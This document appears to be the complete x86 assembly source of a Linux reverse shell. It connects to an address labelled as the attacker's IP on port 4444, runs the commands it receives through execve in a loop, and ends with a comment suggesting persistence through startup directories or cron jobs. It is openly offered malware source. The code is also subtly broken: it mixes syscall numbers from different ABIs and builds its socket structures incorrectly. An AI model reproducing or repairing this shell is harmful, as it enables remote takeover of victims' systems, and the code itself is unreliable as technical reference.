section .data
    ip db '192.168.1.100'         ; Attacker's IP
    port dw 4444                   ; Attacker's port
    msg db 'Connected to remote shell...', 0
    exit_msg db 'Exiting...', 0
    cmd_buffer resb 1024           ; Command buffer
    error_msg db 'Error occurred', 0

section .text
    global _start

_start:
    ; Create socket
    mov eax, 41                  ; syscall: socket
    xor ebx, ebx                 ; AF_INET
    mov ecx, 1                   ; SOCK_STREAM
    xor edx, edx                 ; IPPROTO_IP
    int 0x80                     ; call kernel
    test eax, eax                ; Check for error
    js .error                    ; Jump if error
    mov esi, eax                 ; Save socket descriptor

    ; Setup sockaddr structure
    xor eax, eax                 ; AF_INET
    push eax                     ; sin_family
    mov ax, [port]               ; set port in network byte order
    xchg ax, [esp + 2]          ; 
    mov dword [esp + 4], ip      ; set IP address

    ; Connect to the remote server
    mov eax, 42                  ; syscall: connect
    mov ebx, esi                 ; socket descriptor
    lea ecx, [esp]               ; pointer to sockaddr
    mov edx, 16                  ; length of sockaddr
    int 0x80                     ; call kernel
    test eax, eax                ; Check for error
    js .error                    ; Jump if error

    ; Write connected message
    mov eax, 4                   ; syscall: write
    mov ebx, 1                   ; STDOUT
    mov ecx, msg                 ; message
    mov edx, 30                  ; message length
    int 0x80                     ; call kernel

.loop:
    ; Read command from socket
    xor eax, eax                 ; syscall: read
    mov ebx, esi                 ; socket descriptor
    lea ecx, [cmd_buffer]        ; buffer for command
    mov edx, 1024                ; max length
    int 0x80                     ; call kernel
    test eax, eax                ; Check for error
    js .error                    ; Jump if error

    ; Null-terminate the command string
    mov byte [cmd_buffer + eax], 0

    ; Execute command
    xor eax, eax                 ; syscall: execve
    push eax                     ; null-terminate
    push dword [cmd_buffer]      ; command (buffer)
    mov ebx, esp                 ; argv
    push eax                     ; envp
    int 0x80                     ; call kernel
    jmp .loop                    ; repeat

.error:
    ; Error handling
    mov eax, 4                   ; syscall: write
    mov ebx, 2                   ; STDERR
    mov ecx, error_msg           ; error message
    mov edx, 15                  ; message length
    int 0x80                     ; call kernel

    ; Exit gracefully
    xor eax, eax                 ; syscall: exit
    int 0x80

    ; Optionally implement persistence here
    ; Example: write this executable to a startup directory or set a cron job
